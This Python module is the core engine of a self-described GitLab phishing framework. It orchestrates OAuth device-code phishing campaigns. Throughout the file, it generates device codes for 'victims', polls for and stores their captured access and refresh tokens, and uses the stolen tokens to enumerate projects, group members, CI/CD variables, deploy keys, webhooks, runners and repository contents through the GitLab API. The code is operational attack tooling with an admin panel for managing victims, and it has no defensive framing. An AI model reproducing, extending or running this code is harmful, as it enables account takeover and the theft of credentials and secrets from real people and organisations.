"""
Core Engine module for the GitLab Phishing Framework.
Orchestrates all modules and manages operation lifecycle.
"""

import logging
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any

from ..interfaces import (
    CoreEngineInterface,
    OperationResult
)
from ..models import (
    Config,
    OperationConfig,
    OperationPhase,
    OperationStatus
)
from ..db import Database
from ..modules.device_code import DeviceCodeManager
from ..modules.token_poller import TokenPoller
from ..modules.phishing_server import PhishingServer
from ..modules.web_server import WebServer



logger = logging.getLogger(__name__)


class CoreEngine(CoreEngineInterface):
    """
    Core Engine for orchestrating the GitLab Phishing Framework.
    
    This class coordinates all modules and manages the lifecycle of
    phishing operations, from creation to token capture to post-exploitation.
    """
    
    def __init__(self, config: Config):
        """
        Initialize the Core Engine with all modules.
        
        Args:
            config: Framework configuration object
        """
        self.config = config
        
        # Initialize database
        self.db = Database(config.db_path)
        logger.info(f"Database initialized at {config.db_path}")
        
        # Initialize all modules
        self.device_code_manager = DeviceCodeManager(config)
        self.token_poller = TokenPoller(config)
        self.phishing_server = PhishingServer(config)
        self.web_server = WebServer(config)
        
        # Import post-exploitation module
        from ..modules.post_exploitation import PostExploitation
        self.post_exploitation = PostExploitation(config, self.db)
        
        logger.info("All modules initialized")
        
        # Set up callbacks
        self._setup_callbacks()
        
        # Dictionary to track active operations: {operation_id: OperationConfig}
        self.active_operations: Dict[int, OperationConfig] = {}
        self.operations_lock = threading.Lock()
        
        logger.info("CoreEngine initialized successfully")
    
    def _setup_callbacks(self):
        """Set up callbacks between modules."""
        # Token poller callback - called when token is captured
        self.token_poller.set_token_callback(self.handle_token_received)
        
        # Phishing server callbacks
        self.phishing_server.set_device_code_callback(self._handle_device_code_request)
        self.phishing_server.set_interaction_callback(self._handle_interaction)
        
        # Web server callback - provides access to engine methods
        self.web_server.set_engine_callback(self._handle_web_request)
        
        logger.debug("Module callbacks configured")
    
    def start_admin_only(self) -> OperationResult:
        """
        Start only the admin panel without any operations.
        
        This allows operators to access the admin interface to create
        and manage operations without starting any phishing campaigns.
        
        Returns:
            OperationResult indicating admin panel started
        """
        logger.info("Starting admin panel in standalone mode")
        
        try:
            # Start the web server (admin panel)
            result = self.web_server.start_server(self.config.admin_port)
            
            if result.success:
                logger.info(
                    f"Admin panel started successfully on "
                    f"http://{self.config.host}:{self.config.admin_port}/admin"
                )
                return OperationResult(
                    success=True,
                    data={
                        'admin_url': f"http://{self.config.host}:{self.config.admin_port}/admin",
                        'admin_port': self.config.admin_port
                    },
                    message="Admin panel started successfully"
                )
            else:
                logger.error(f"Failed to start admin panel: {result.error}")
                return result
        
        except Exception as e:
            error_msg = f"Failed to start admin panel: {str(e)}"
            logger.exception(error_msg)
            return OperationResult(
                success=False,
                error=error_msg
            )
    
    def start_operation(self, operation_id: int, scopes: List[str], 
                       instance_type: str, base_url: str, 
                       client_id: str) -> OperationResult:
        """
        Start a phishing operation.
        
        This method:
        1. Validates the operation exists in database
        2. Creates operation configuration
        3. Registers operation with phishing server
        4. Starts phishing server if not already running
        5. Updates operation status to RUNNING
        
        Args:
            operation_id: ID of the operation
            scopes: List of OAuth scopes
            instance_type: 'saas' or 'self-managed'
            base_url: GitLab instance base URL
            client_id: OAuth application client ID
            
        Returns:
            OperationResult indicating operation started
        """
        logger.info(f"Starting operation {operation_id}")
        
        try:
            # Get operation from database
            operation_data = self.db.get_operation(operation_id)
            if not operation_data:
                error_msg = f"Operation {operation_id} not found in database"
                logger.error(error_msg)
                return OperationResult(
                    success=False,
                    error=error_msg
                )
            
            # Check if operation is already running
            with self.operations_lock:
                if operation_id in self.active_operations:
                    logger.warning(f"Operation {operation_id} is already running")
                    return OperationResult(
                        success=False,
                        error="Operation is already running"
                    )
            
            # Create operation configuration
            operation_config = OperationConfig(
                operation_id=operation_id,
                name=operation_data['name'],
                instance_type=instance_type,
                base_url=base_url,
                client_id=client_id,
                scopes=scopes,
                template=operation_data.get('template')
            )
            
            # Start phishing server if not already running
            if not self.phishing_server.is_running:
                logger.info("Starting phishing server")
                if not self.phishing_server.start():
                    error_msg = "Failed to start phishing server"
                    logger.error(error_msg)
                    return OperationResult(
                        success=False,
                        error=error_msg
                    )
            
            # Register operation with phishing server
            if not self.phishing_server.register_operation(operation_id, operation_config):
                error_msg = f"Failed to register operation {operation_id} with phishing server"
                logger.error(error_msg)
                return OperationResult(
                    success=False,
                    error=error_msg
                )
            
            # Add to active operations
            with self.operations_lock:
                self.active_operations[operation_id] = operation_config
            
            # Update operation status in database
            self.db.update_operation_status(
                operation_id,
                OperationPhase.RUNNING.value,
                started_at=datetime.now()
            )
            
            # Log activity
            self.db.log_activity(
                operation_id,
                "operation_started",
                f"Operation started: {operation_config.name}"
            )
            
            phishing_url = f"http://{self.config.host}:{self.config.phishing_port}/op/{operation_id}"
            
            logger.info(f"Operation {operation_id} started successfully. Phishing URL: {phishing_url}")
            
            return OperationResult(
                success=True,
                data={
                    'operation_id': operation_id,
                    'phishing_url': phishing_url,
                    'admin_url': f"http://{self.config.host}:{self.config.admin_port}/admin"
                },
                message=f"Operation {operation_id} started successfully"
            )
        
        except Exception as e:
            error_msg = f"Failed to start operation {operation_id}: {str(e)}"
            logger.exception(error_msg)
            return OperationResult(
                success=False,
                error=error_msg
            )
    
    def stop_operation(self, operation_id: int) -> OperationResult:
        """
        Stop a running operation.
        
        This method:
        1. Unregisters operation from phishing server
        2. Stops all polling threads for this operation
        3. Updates operation status to STOPPED
        4. Removes from active operations
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            OperationResult indicating operation stopped
        """
        logger.info(f"Stopping operation {operation_id}")
        
        try:
            # Check if operation is active
            with self.operations_lock:
                if operation_id not in self.active_operations:
                    logger.warning(f"Operation {operation_id} is not running")
                    return OperationResult(
                        success=False,
                        error="Operation is not running"
                    )
            
            # Get all victims for this operation
            victims = self.db.get_victims(operation_id)
            
            # Stop polling for all victims
            for victim in victims:
                victim_id = victim['id']
                try:
                    self.token_poller.stop_polling(operation_id, victim_id)
                except Exception as e:
                    logger.warning(f"Error stopping polling for victim {victim_id}: {e}")
            
            # Unregister from phishing server
            self.phishing_server.unregister_operation(operation_id)
            
            # Remove from active operations
            with self.operations_lock:
                operation_config = self.active_operations.pop(operation_id, None)
            
            # Update operation status in database
            self.db.update_operation_status(
                operation_id,
                OperationPhase.STOPPED.value,
                stopped_at=datetime.now()
            )
            
            # Log activity
            self.db.log_activity(
                operation_id,
                "operation_stopped",
                f"Operation stopped: {operation_config.name if operation_config else 'Unknown'}"
            )
            
            logger.info(f"Operation {operation_id} stopped successfully")
            
            return OperationResult(
                success=True,
                message=f"Operation {operation_id} stopped successfully"
            )
        
        except Exception as e:
            error_msg = f"Failed to stop operation {operation_id}: {str(e)}"
            logger.exception(error_msg)
            return OperationResult(
                success=False,
                error=error_msg
            )
    
    def get_operation_status(self, operation_id: int) -> Optional[OperationStatus]:
        """
        Get current status of an operation.
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            OperationStatus object or None if operation not found
        """
        try:
            # Get operation from database
            operation_data = self.db.get_operation(operation_id)
            if not operation_data:
                logger.warning(f"Operation {operation_id} not found")
                return None
            
            # Get victims count
            victims = self.db.get_victims(operation_id)
            victims_count = len(victims)
            
            # Count tokens captured
            tokens_captured = sum(1 for v in victims if v['status'] == 'authorized')
            
            # Count projects discovered
            projects_count = 0
            for victim in victims:
                projects = self.db.get_projects(victim['id'])
                projects_count += len(projects)
            
            # Get last activity
            activity_log = self.db.get_activity_log(operation_id, limit=1)
            last_activity = datetime.now()
            if activity_log:
                last_activity = datetime.fromisoformat(activity_log[0]['timestamp'])
            
            # Determine phase
            phase = OperationPhase(operation_data['status'])
            
            status = OperationStatus(
                operation_id=operation_id,
                phase=phase,
                victims_count=victims_count,
                tokens_captured=tokens_captured,
                projects_discovered=projects_count,
                ssh_keys_injected=0,
                last_activity=last_activity
            )
            
            return status
        
        except Exception as e:
            logger.error(f"Error getting operation status for {operation_id}: {e}")
            return None
    
    def handle_token_received(self, operation_id: int, victim_id: int, 
                             access_token: str, refresh_token: Optional[str],
                             scope: str, expires_in: Optional[int]) -> None:
        """
        Handle token capture event.
        
        This callback is triggered by the TokenPoller when a token is captured.
        It orchestrates the post-exploitation workflow:
        1. Store token in database
        2. Update victim status
        3. Trigger resource enumeration
        4. Log all activities
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            access_token: Captured access token
            refresh_token: Captured refresh token (optional)
            scope: Token scope
            expires_in: Token expiration time in seconds (optional)
        """
        logger.info(f"Token received for victim {victim_id} in operation {operation_id}")
        
        try:
            # Get operation configuration
            with self.operations_lock:
                operation_config = self.active_operations.get(operation_id)
            
            if not operation_config:
                logger.error(f"Operation {operation_id} not found in active operations")
                return
            
            # Store token in database
            self.db.store_token(victim_id, access_token, refresh_token, scope, expires_in)
            logger.info(f"Token stored for victim {victim_id} (has refresh_token: {refresh_token is not None})")
            
            # Update victim status to authorized
            self.db.update_victim_status(
                victim_id,
                "authorized",
                authorized_at=datetime.now()
            )
            
            # Update operation phase to AUTHORIZED
            self.db.update_operation_status(
                operation_id,
                OperationPhase.AUTHORIZED.value
            )
            
            # Log token capture
            self.db.log_activity(
                operation_id,
                "token_captured",
                f"Access token captured for victim {victim_id} with scope: {scope}"
            )
            
            # Token captured successfully - wait for attacker to decide what to enumerate
            logger.info(f"Token captured for victim {victim_id} - waiting for attacker actions")
        
        except Exception as e:
            error_msg = f"Error in token received handler: {str(e)}"
            logger.exception(error_msg)
            
            # Log error
            try:
                self.db.log_activity(
                    operation_id,
                    "error",
                    error_msg
                )
                self.db.update_operation_status(
                    operation_id,
                    OperationPhase.ERROR.value
                )
            except:
                pass
    
    def _enumerate_victim(self, victim_id: int, options: Dict[str, bool]) -> Dict[str, Any]:
        """
        Start enumeration for a specific victim based on attacker's choices.
        
        Args:
            victim_id: ID of the victim
            options: Dictionary of enumeration options
            
        Returns:
            Dictionary with success status
        """
        try:
            # Get victim from database
            victim = self.db.get_victim(victim_id)
            if not victim:
                return {
                    'success': False,
                    'error': 'Victim not found'
                }
            
            # Check if victim is authorized
            if victim['status'] != 'authorized':
                return {
                    'success': False,
                    'error': 'Victim has not authorized yet (no token available)'
                }
            
            # Get token
            token = self.db.get_token(victim_id)
            if not token:
                return {
                    'success': False,
                    'error': 'No token found for this victim'
                }
            
            # Get operation
            operation = self.db.get_operation(victim['operation_id'])
            if not operation:
                return {
                    'success': False,
                    'error': 'Operation not found'
                }
            
            # Start enumeration in background thread
            enumeration_thread = threading.Thread(
                target=self._run_manual_enumeration,
                args=(victim['operation_id'], victim_id, token['access_token'], 
                      operation['base_url'], token['scope'], options),
                daemon=True,
                name=f"ManualEnum-{victim_id}"
            )
            enumeration_thread.start()
            
            logger.info(f"Manual enumeration started for victim {victim_id}")
            
            return {
                'success': True,
                'message': 'Enumeration started in background'
            }
        
        except Exception as e:
            error_msg = f"Failed to start enumeration: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def _run_manual_enumeration(self, operation_id: int, victim_id: int, 
                               access_token: str, base_url: str, 
                               scope: str, options: Dict[str, bool]) -> None:
        """
        Run manual enumeration based on attacker's choices.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            access_token: Access token
            base_url: GitLab base URL
            scope: Token scope
            options: Enumeration options
        """
        try:
            logger.info(f"Starting manual enumeration for victim {victim_id} with options: {options}")
            
            # Update status
            self.db.update_operation_status(operation_id, OperationPhase.ENUMERATING.value)
            self.db.log_activity(operation_id, "enumeration_started", 
                               f"Manual enumeration started for victim {victim_id}")
            
            # Run enumeration if requested
            if options.get('enum_user') or options.get('enum_projects') or options.get('enum_groups'):
                # Use the post_exploitation module's resource enumerator
                enumeration_result = self.post_exploitation.resource_enumerator.enumerate_all(
                    operation_id, victim_id, access_token, base_url
                )
                
                # Store results
                projects_count = 0
                if enumeration_result.data:
                    enum_data = enumeration_result.data
                    
                    # Store user info
                    if enum_data.get('user_info'):
                        user_info = enum_data['user_info']
                        self.db.update_victim_info(
                            victim_id,
                            username=user_info.get('username'),
                            email=user_info.get('email'),
                            user_id=user_info.get('user_id')
                        )
                    
                    # Store groups
                    if enum_data.get('groups'):
                        for group in enum_data['groups']:
                            group_db_id = self.db.store_group(victim_id, group)
                            
                            # Store group members
                            group_gitlab_id = group.get('id')
                            if group_gitlab_id in enum_data.get('group_members', {}):
                                for member in enum_data['group_members'][group_gitlab_id]:
                                    self.db.store_group_member(group_db_id, member)
                    
                    # Store snippets
                    if enum_data.get('snippets'):
                        for snippet in enum_data['snippets']:
                            self.db.store_snippet(victim_id, snippet)
                    
                    # Store projects and related data
                    if enum_data.get('projects'):
                        projects_count = len(enum_data['projects'])
                        for project in enum_data['projects']:
                            project_db_id = self.db.store_project(victim_id, project)
                            project_gitlab_id = project.get('id')
                            
                            # Store CI/CD variables if requested
                            if options.get('enum_ci_variables'):
                                if project_gitlab_id in enum_data.get('ci_variables', {}):
                                    for variable in enum_data['ci_variables'][project_gitlab_id]:
                                        self.db.store_ci_variable(
                                            project_db_id,
                                            variable['key'],
                                            variable.get('value'),
                                            variable.get('masked', False),
                                            variable.get('protected', False)
                                        )
                            
                            # Store project members
                            if project_gitlab_id in enum_data.get('project_members', {}):
                                for member in enum_data['project_members'][project_gitlab_id]:
                                    self.db.store_project_member(project_db_id, member)
                            
                            # Store merge requests
                            if project_gitlab_id in enum_data.get('merge_requests', {}):
                                for mr in enum_data['merge_requests'][project_gitlab_id]:
                                    self.db.store_merge_request(project_db_id, mr)
                            
                            # Store issues
                            if project_gitlab_id in enum_data.get('issues', {}):
                                for issue in enum_data['issues'][project_gitlab_id]:
                                    self.db.store_issue(project_db_id, issue)
                            
                            # Store deploy keys if requested
                            if options.get('enum_ssh_keys'):
                                if project_gitlab_id in enum_data.get('deploy_keys', {}):
                                    for key in enum_data['deploy_keys'][project_gitlab_id]:
                                        self.db.store_deploy_key(project_db_id, key)
                            
                            # Store webhooks
                            if project_gitlab_id in enum_data.get('webhooks', {}):
                                for hook in enum_data['webhooks'][project_gitlab_id]:
                                    self.db.store_webhook(project_db_id, hook)
                            
                            # Store protected branches
                            if project_gitlab_id in enum_data.get('protected_branches', {}):
                                for branch in enum_data['protected_branches'][project_gitlab_id]:
                                    self.db.store_protected_branch(project_db_id, branch)
                            
                            # Store runners
                            if project_gitlab_id in enum_data.get('runners', {}):
                                for runner in enum_data['runners'][project_gitlab_id]:
                                    self.db.store_runner(project_db_id, runner)
                            
                            # Store container registries
                            if project_gitlab_id in enum_data.get('container_registries', {}):
                                for registry in enum_data['container_registries'][project_gitlab_id]:
                                    self.db.store_container_registry(project_db_id, registry)
                            
                            # Store packages
                            if project_gitlab_id in enum_data.get('packages', {}):
                                for package in enum_data['packages'][project_gitlab_id]:
                                    self.db.store_package(project_db_id, package)
                
                # Always log enumeration_complete event, regardless of results
                self.db.log_activity(operation_id, "enumeration_complete",
                                   f"Enumeration completed: {projects_count} projects found")
            else:
                # No enumeration options selected, but still log completion
                self.db.log_activity(operation_id, "enumeration_complete",
                                   "Enumeration completed: No enumeration options selected")
            
            # Mark as completed
            self.db.update_operation_status(operation_id, OperationPhase.COMPLETED.value)
            logger.info(f"Manual enumeration completed for victim {victim_id}")
            
        except Exception as e:
            logger.error(f"Error in manual enumeration: {e}", exc_info=True)
            self.db.log_activity(operation_id, "enumeration_error", f"Error: {str(e)}")
    
    def _handle_device_code_request(self, operation_id: int, 
                                    ip_address: str, user_agent: str) -> Dict[str, Any]:
        """
        Handle device code generation request from phishing server.
        
        Args:
            operation_id: ID of the operation
            ip_address: Victim's IP address
            user_agent: Victim's user agent
            
        Returns:
            Dictionary with success status and device code data
        """
        try:
            # Get operation configuration
            with self.operations_lock:
                operation_config = self.active_operations.get(operation_id)
            
            if not operation_config:
                logger.error(f"Operation {operation_id} not found")
                return {
                    'success': False,
                    'error': 'Operation not found'
                }
            
            # Generate device code
            result = self.device_code_manager.generate_code(
                operation_config.scopes,
                operation_config.base_url,
                operation_config.client_id
            )
            
            if not result.success:
                logger.error(f"Device code generation failed: {result.error}")
                return {
                    'success': False,
                    'error': result.error
                }
            
            # Extract device code data
            device_code_data = result.data
            device_code = device_code_data['device_code']
            user_code = device_code_data['user_code']
            interval = device_code_data['interval']
            
            # Add victim to database
            victim_id = self.db.add_victim(
                operation_id,
                user_code,
                device_code,
                ip_address,
                user_agent
            )
            
            # Start polling for this victim
            self.token_poller.start_polling(
                operation_id,
                victim_id,
                device_code,
                operation_config.base_url,
                operation_config.client_id,
                interval
            )
            
            logger.info(f"Device code generated and polling started for victim {victim_id}")
            
            return {
                'success': True,
                'data': {
                    'user_code': user_code,
                    'verification_uri': device_code_data['verification_uri'],
                    'verification_uri_complete': device_code_data['verification_uri_complete'],
                    'expires_in': device_code_data['expires_in']
                }
            }
        
        except Exception as e:
            error_msg = f"Error handling device code request: {str(e)}"
            logger.exception(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def _handle_interaction(self, operation_id: int, interaction_type: str,
                           ip_address: str, user_agent: str, data: Dict = None) -> None:
        """
        Handle victim interaction tracking from phishing server.
        
        Args:
            operation_id: ID of the operation
            interaction_type: Type of interaction
            ip_address: Victim's IP address
            user_agent: Victim's user agent
            data: Additional interaction data
        """
        try:
            message = f"Victim interaction: {interaction_type}"
            
            # Log interaction
            self.db.log_activity(
                operation_id,
                f"interaction_{interaction_type}",
                message
            )
            
            logger.debug(f"Interaction tracked: {interaction_type} for operation {operation_id}")
        
        except Exception as e:
            logger.error(f"Error handling interaction: {e}")
    
    def _handle_web_request(self, action: str, *args, **kwargs) -> Any:
        """
        Handle requests from the web server (admin panel).
        
        This method routes admin panel API calls to the appropriate engine methods.
        
        Args:
            action: Action to perform
            *args: Positional arguments for the action
            **kwargs: Keyword arguments for the action
            
        Returns:
            Result of the action
        """
        try:
            if action == 'get_stats':
                return self.db.get_stats()
            
            elif action == 'get_all_operations':
                return self.db.get_all_operations()
            
            elif action == 'get_operation':
                operation_id = args[0] if args else kwargs.get('operation_id')
                return self.db.get_operation(operation_id)
            
            elif action == 'create_operation':
                data = args[0] if args else kwargs.get('data')
                return self._create_operation(data)
            
            elif action == 'start_operation':
                operation_id = args[0] if args else kwargs.get('operation_id')
                return self._start_operation_from_web(operation_id)
            
            elif action == 'stop_operation':
                operation_id = args[0] if args else kwargs.get('operation_id')
                result = self.stop_operation(operation_id)
                return {'success': result.success, 'message': result.message, 'error': result.error}
            
            elif action == 'get_victims':
                operation_id = args[0] if args else kwargs.get('operation_id')
                return self.db.get_victims(operation_id)
            
            elif action == 'get_victim':
                victim_id = args[0] if args else kwargs.get('victim_id')
                return self.db.get_victim(victim_id)
            
            elif action == 'get_victim_token':
                victim_id = args[0] if args else kwargs.get('victim_id')
                return self.db.get_token(victim_id)
            
            elif action == 'get_activity_log':
                operation_id = args[0] if args else kwargs.get('operation_id')
                limit = args[1] if len(args) > 1 else kwargs.get('limit')
                return self.db.get_activity_log(operation_id, limit)
            
            elif action == 'get_templates':
                return self.device_code_manager.get_scope_templates()
            
            elif action == 'get_scopes':
                return self.device_code_manager.get_all_scopes()
            
            elif action == 'delete_operation':
                operation_id = args[0] if args else kwargs.get('operation_id')
                return self._delete_operation(operation_id)
            
            elif action == 'delete_victim':
                victim_id = args[0] if args else kwargs.get('victim_id')
                return self._delete_victim(victim_id)
            
            elif action == 'reset_database':
                return self._reset_database()
            
            elif action == 'enumerate_victim':
                victim_id = args[0] if args else kwargs.get('victim_id')
                options = args[1] if len(args) > 1 else kwargs.get('options', {})
                return self._enumerate_victim(victim_id, options)
            
            elif action == 'enumerate_project_deeper':
                project_id = args[0] if args else kwargs.get('project_id')
                victim_id = args[1] if len(args) > 1 else kwargs.get('victim_id')
                return self._enumerate_project_deeper(project_id, victim_id)
            
            else:
                logger.warning(f"Unknown web request action: {action}")
                return {'error': f'Unknown action: {action}'}
        
        except Exception as e:
            logger.error(f"Error handling web request '{action}': {e}")
            return {'error': str(e)}
    
    def _create_operation(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Create a new operation from web request.
        
        Args:
            data: Operation data from web request
            
        Returns:
            Dictionary with success status and operation ID
        """
        try:
            # Extract data
            name = data.get('name')
            instance_type = data.get('instance_type')
            base_url = data.get('base_url')
            client_id = data.get('client_id')
            scopes = data.get('scopes', [])
            template = data.get('template')
            
            # Create operation in database
            operation_id = self.db.create_operation(
                name,
                instance_type,
                base_url,
                client_id,
                template,
                scopes
            )
            
            logger.info(f"Operation created: {operation_id} - {name}")
            
            return {
                'success': True,
                'operation_id': operation_id,
                'message': f'Operation created successfully'
            }
        
        except Exception as e:
            error_msg = f"Failed to create operation: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def _start_operation_from_web(self, operation_id: int) -> Dict[str, Any]:
        """
        Start an operation from web request.
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            Dictionary with success status
        """
        try:
            # Get operation from database
            operation_data = self.db.get_operation(operation_id)
            if not operation_data:
                return {
                    'success': False,
                    'error': 'Operation not found'
                }
            
            # Start operation
            result = self.start_operation(
                operation_id,
                operation_data['scopes'],
                operation_data['instance_type'],
                operation_data['base_url'],
                operation_data['client_id']
            )
            
            return {
                'success': result.success,
                'message': result.message,
                'error': result.error,
                'data': result.data
            }
        
        except Exception as e:
            error_msg = f"Failed to start operation: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def _delete_operation(self, operation_id: int) -> Dict[str, Any]:
        """
        Delete an operation from web request.
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            Dictionary with success status
        """
        try:
            # Get operation from database
            operation_data = self.db.get_operation(operation_id)
            if not operation_data:
                return {
                    'success': False,
                    'error': 'Operation not found'
                }
            
            # Check if operation is running
            with self.operations_lock:
                if operation_id in self.active_operations:
                    return {
                        'success': False,
                        'error': 'Cannot delete a running operation. Please stop it first.'
                    }
            
            # Delete operation from database
            self.db.delete_operation(operation_id)
            
            logger.info(f"Operation {operation_id} deleted successfully")
            
            return {
                'success': True,
                'message': f'Operation {operation_id} deleted successfully'
            }
        
        except Exception as e:
            error_msg = f"Failed to delete operation: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def _enumerate_project_deeper(self, project_id: int, victim_id: int) -> Dict[str, Any]:
        """
        Enumerate deeper details of a specific project.
        
        Args:
            project_id: GitLab project ID
            victim_id: Victim ID to get token
            
        Returns:
            Dictionary with files, commits, branches, tags
        """
        try:
            # Get victim and token
            victim = self.db.get_victim(victim_id)
            if not victim:
                return {'success': False, 'error': 'Victim not found'}
            
            token_data = self.db.get_token(victim_id)
            if not token_data:
                return {'success': False, 'error': 'No token found'}
            
            operation = self.db.get_operation(victim['operation_id'])
            if not operation:
                return {'success': False, 'error': 'Operation not found'}
            
            access_token = token_data['access_token']
            base_url = operation['base_url']
            
            # Use resource enumerator to get deeper data
            import requests
            headers = {'Authorization': f'Bearer {access_token}'}
            results = {}
            
            # Get repository tree (files)
            try:
                url = f"{base_url}/api/v4/projects/{project_id}/repository/tree"
                response = requests.get(url, headers=headers, params={'per_page': 100, 'recursive': True}, 
                                      timeout=self.config.api_timeout, verify=self.config.verify_ssl)
                if response.status_code == 200:
                    results['files'] = response.json()
            except Exception as e:
                logger.debug(f"Failed to get files: {e}")
                results['files'] = []
            
            # Get recent commits
            try:
                url = f"{base_url}/api/v4/projects/{project_id}/repository/commits"
                response = requests.get(url, headers=headers, params={'per_page': 10}, 
                                      timeout=self.config.api_timeout, verify=self.config.verify_ssl)
                if response.status_code == 200:
                    results['commits'] = response.json()
            except Exception as e:
                logger.debug(f"Failed to get commits: {e}")
                results['commits'] = []
            
            # Get branches
            try:
                url = f"{base_url}/api/v4/projects/{project_id}/repository/branches"
                response = requests.get(url, headers=headers, params={'per_page': 50}, 
                                      timeout=self.config.api_timeout, verify=self.config.verify_ssl)
                if response.status_code == 200:
                    results['branches'] = response.json()
            except Exception as e:
                logger.debug(f"Failed to get branches: {e}")
                results['branches'] = []
            
            # Get tags
            try:
                url = f"{base_url}/api/v4/projects/{project_id}/repository/tags"
                response = requests.get(url, headers=headers, params={'per_page': 50}, 
                                      timeout=self.config.api_timeout, verify=self.config.verify_ssl)
                if response.status_code == 200:
                    results['tags'] = response.json()
            except Exception as e:
                logger.debug(f"Failed to get tags: {e}")
                results['tags'] = []
            
            logger.info(f"Deep enumeration complete for project {project_id}")
            return {'success': True, 'data': results}
            
        except Exception as e:
            error_msg = f"Failed to enumerate project deeper: {str(e)}"
            logger.error(error_msg)
            return {'success': False, 'error': error_msg}
    
    def _delete_victim(self, victim_id: int) -> Dict[str, Any]:
        """
        Delete a victim from web request.
        
        Args:
            victim_id: ID of the victim
            
        Returns:
            Dictionary with success status
        """
        try:
            # Get victim from database
            victim_data = self.db.get_victim(victim_id)
            if not victim_data:
                return {
                    'success': False,
                    'error': 'Victim not found'
                }
            
            operation_id = victim_data['operation_id']
            
            # Stop polling for this victim if active
            try:
                self.token_poller.stop_polling(operation_id, victim_id)
            except Exception as e:
                logger.debug(f"Could not stop polling for victim {victim_id}: {e}")
            
            # Delete victim from database
            self.db.delete_victim(victim_id)
            
            logger.info(f"Victim {victim_id} deleted successfully")
            
            return {
                'success': True,
                'message': f'Victim {victim_id} deleted successfully'
            }
        
        except Exception as e:
            error_msg = f"Failed to delete victim: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def _reset_database(self) -> Dict[str, Any]:
        """
        Reset the entire database (delete all data).
        
        This will stop all running operations and delete all data from the database.
        
        Returns:
            Dictionary with success status
        """
        try:
            logger.warning("Database reset requested - stopping all operations")
            
            # Stop all active operations first
            with self.operations_lock:
                operation_ids = list(self.active_operations.keys())
            
            for operation_id in operation_ids:
                try:
                    logger.info(f"Stopping operation {operation_id} before database reset")
                    self.stop_operation(operation_id)
                except Exception as e:
                    logger.error(f"Error stopping operation {operation_id}: {e}")
            
            # Stop all polling threads
            try:
                self.token_poller.stop_all_polling()
            except Exception as e:
                logger.error(f"Error stopping token poller: {e}")
            
            # Reset the database
            self.db.reset_database()
            
            logger.warning("Database has been reset - all data deleted")
            
            return {
                'success': True,
                'message': 'Database reset successfully - all data has been deleted'
            }
        
        except Exception as e:
            error_msg = f"Failed to reset database: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }
    
    def shutdown(self) -> None:
        """
        Gracefully shutdown the engine and all modules.
        
        This method should be called when the framework is being stopped.
        """
        logger.info("Shutting down CoreEngine")
        
        try:
            # Stop all active operations
            with self.operations_lock:
                operation_ids = list(self.active_operations.keys())
            
            for operation_id in operation_ids:
                try:
                    self.stop_operation(operation_id)
                except Exception as e:
                    logger.error(f"Error stopping operation {operation_id}: {e}")
            
            # Stop all polling threads
            self.token_poller.stop_all_polling()
            
            # Stop phishing server
            if self.phishing_server.is_running:
                self.phishing_server.stop()
            
            # Stop web server
            if self.web_server.is_running:
                self.web_server.stop_server()
            
            # Close database
            self.db.close()
            
            logger.info("CoreEngine shutdown complete")
        
        except Exception as e:
            logger.error(f"Error during shutdown: {e}")
